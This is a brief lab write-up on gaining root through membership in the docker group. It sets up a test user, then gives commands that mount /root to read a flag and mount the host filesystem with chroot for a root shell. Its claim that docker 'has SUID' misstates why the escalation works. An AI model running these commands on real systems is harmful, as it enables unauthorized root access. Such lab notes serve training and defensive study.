# SUID Docker

## <mark style="color:red;">Simulation</mark>

install docker using this:

{% embed url="https://docs.docker.com/engine/install/debian/#install-using-the-repository" %}

after the installation is completed add a new user for this test and add it to the docker group

#### `adduser test` `usermod -aG docker test`

Now ssh to the target with the new user

we have access to the docker group

to test this run docker hello-world default image

#### `docker run hello-world`

what just happened was docker client connected to docker daemon and the daemon pulled the "hello-world" image from docker hub. then it created a nre container from that image and ran it. then the daemon streamed the output "Hello from Docker!" to docker client which sent it to the terminal.

## <mark style="color:red;">Exploitation</mark>

To gain a root shell, we can do this with another image like an ubuntu container:

#### `docker run ubuntu`

one of dockers features is that it can mount a directory from the host system to a directory in the container for quick file grabbing.

#### `docker run -v /root:/mnt ubuntu cat /mnt/flag.txt`

By using the -v flag we specified a volume to mount, in this case the /root directory on the host was mounted to the /mnt directory on the container. Because docker has SUID we were able to mount a root owned directory in our container!

we can get a shell using the same technique combined with the chroot command

#### `docker run -it -v /:/mnt ubuntu chroot /mnt`
